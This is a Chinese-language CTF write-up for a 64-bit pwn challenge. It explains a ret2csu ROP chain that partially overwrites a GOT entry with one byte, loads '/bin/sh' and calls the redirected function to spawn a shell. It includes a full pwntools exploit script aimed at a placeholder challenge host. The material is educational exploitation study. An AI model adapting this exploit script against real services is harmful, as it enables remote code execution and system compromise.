# week3whitegive_3

## 题目简述

64 位程序的短栈溢出只能容纳有限 ROP。二进制提供一对类似 `__libc_csu_init` 的批量寄存器装载/间接调用 gadget，可构造三次函数调用：先单字节覆盖 GOT，再读入 `/bin/sh`，最后通过被改写的 GOT 项调用目标 libc 函数取得 Shell。原解来自 0xdeadc0de。

## 解题过程

`0x4012AA` 负责弹出循环计数和参数寄存器，`0x401290` 负责设置 `rdi/rsi/rdx` 并通过 GOT 间接调用。第一组调用等价于 `read(0, 0x404020, 1)`，把该 GOT 函数指针的最低字节改成 `0x15`；在题目固定 libc 布局中，这会把它重定向到所需调用目标。第二组调用 `read(0, 0x404100, 0x900)` 写入 `/bin/sh`，第三组再以 `0x404100` 为首参调用被改写的 GOT 项。

```python
from pwn import *

HOST = 'challenge-host'
PORT = 8007
p = remote(HOST, PORT)
print(p.recvline())
payload = p64(0x4012AA) + p64(0) + p64(1) + p64(0) + p64(0x404020) + p64(0x1) + p64(0x404028) + p64(0x401290)
payload += p64(0) + p64(0) + p64(1) + p64(0) + p64(0x404100) + p64(0x900) + p64(0x404028) + p64(0x401290)
payload += p64(0) + p64(0) + p64(1) + p64(0x404100) + p64(0) + p64(0) + p64(0x404020) + p64(0x401290)
p.send(b"a" * 32 + p64(0) + payload)
sleep(1)
p.send(b'\x15')
sleep(1)
p.send(b'/bin/sh\x00' + b'a' * 0x33)
p.sendline(b"exec 1>&0")
p.interactive()
```

## 方法总结

这是 ret2csu 与 GOT 部分覆盖的组合。ret2csu 解决“缺少独立 `pop rdx` 等 gadget”的参数控制问题，单字节覆盖则利用 ASLR 不改变页内低位这一事实，把已解析函数指针改到同一 libc 附近的目标函数。该技巧强依赖精确 libc 版本和 GOT 可写性；若启用 Full RELRO 或换用不同 libc，`0x15` 不再具有通用意义。最后的 `exec 1>&0` 用于把 Shell 输出重定向回可见连接。
